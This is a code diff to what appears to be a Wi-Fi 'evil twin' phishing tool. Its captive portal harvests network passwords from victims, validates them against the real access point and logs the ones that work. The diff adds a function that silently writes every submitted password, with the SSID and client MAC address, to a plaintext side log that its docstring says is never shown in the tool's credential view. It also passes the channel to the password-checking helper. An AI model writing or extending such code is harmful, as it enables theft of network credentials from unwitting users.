@@ -4107,6 +4107,20 @@ def prepare_twin_portal():
 
 
 
+def log_portal_attempt(ssid, client_mac, psk, result, detail=''):
+    """Debug trail for portal password checks (never shown in Credentials)."""
+    try:
+        os.makedirs(LOG_DIR, exist_ok=True)
+        with open('/var/log/pinapple/portal_attempts.log', 'a') as handle:
+            handle.write('%s\t%s\t%s\t%s\t%s\t%s\n' % (
+                datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                ssid or '-', client_mac or '-', result, psk,
+                str(detail).replace('\t', ' ')))
+        os.chmod('/var/log/pinapple/portal_attempts.log', 0o600)
+    except OSError:
+        pass
+
+
 def _log_credential(client_ip, client_mac, portal_type, data):
     entry = {
         'timestamp': datetime.datetime.now().isoformat(timespec='seconds'),
@@ -4194,7 +4208,8 @@ def validate_psk_with_ap(psk, timeout=18):
         try:
             r = subprocess.run(
                 [PSK_HELPER, '--ssid', ssid, '--bssid', bssid,
-                 '--psk', psk, '--timeout', str(timeout)],
+                 '--psk', psk, '--timeout', str(timeout),
+                 '--channel', str(int(info.get('channel') or 6))],
                 capture_output=True, text=True, timeout=timeout + 20)
             payload = {}
             for line in (r.stdout or '').strip().splitlines():
@@ -4651,6 +4666,8 @@ def portal_submit():
                 mimetype='text/html')
         check = validate_psk_with_ap(psk)
         ssid = str(twin_state.get('ssid', ''))
+        log_portal_attempt(ssid, client_mac, psk,
+                           check.get('result', '?'), check.get('detail', ''))
         if check.get('result') == 'ok':
             _log_credential(client_ip, client_mac, 'wifi-psk',
                             {'ssid': ssid, 'bssid': str(twin_state.get('bssid', '')),
